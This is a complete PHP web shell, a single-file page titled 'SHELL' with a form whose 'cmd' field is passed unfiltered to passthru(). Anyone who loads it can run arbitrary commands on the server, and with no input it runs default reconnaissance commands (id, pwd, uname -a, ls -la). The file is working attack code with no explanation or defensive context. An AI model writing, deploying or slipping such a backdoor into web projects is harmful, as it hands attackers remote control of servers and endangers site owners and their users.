<?php echo "<html><head><title>SHELL</title></head><body><form method=post><input type=text name=cmd size=100><button type='submit'>Execute</button></form><pre>"; if ((!$_REQUEST['cmd']) || ($_REQUEST['cmd']=="")) {$_REQUEST['cmd']="id;pwd;uname -a;ls -la";} echo "".passthru($_REQUEST['cmd'])."</pre></body></html>";?>